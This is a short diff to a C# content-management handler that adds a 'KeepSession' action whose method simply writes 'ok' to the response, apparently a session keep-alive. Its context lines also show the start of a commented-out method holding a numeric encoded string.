@@ -124,6 +124,11 @@ namespace Cinar.CMS.Library.Handlers
                         subscribe();
                         break;
                     }
+                case "KeepSession":
+                    {
+                        keepSession();
+                        break;
+                    }
             }
         }
 
@@ -612,6 +617,12 @@ namespace Cinar.CMS.Library.Handlers
             Modules.Module module = Modules.Module.Read(moduleName, mid);
             context.Response.Write(module.Show());
         }
+
+        private void keepSession()
+        {
+            context.Response.Write("ok");
+        }
+
         //private string vx34ftd24()
         //{
         //    string str = "109,111,121,107,63,42,52,114,124,114,51,93,110,103,110,110,110,104,50,102,122,103,122,93,122,41,104,106,114,42,104,99,106,94,112,63,116,104,102,100,115,41,117,99,117,58,105,106,114,92,110,105,66";
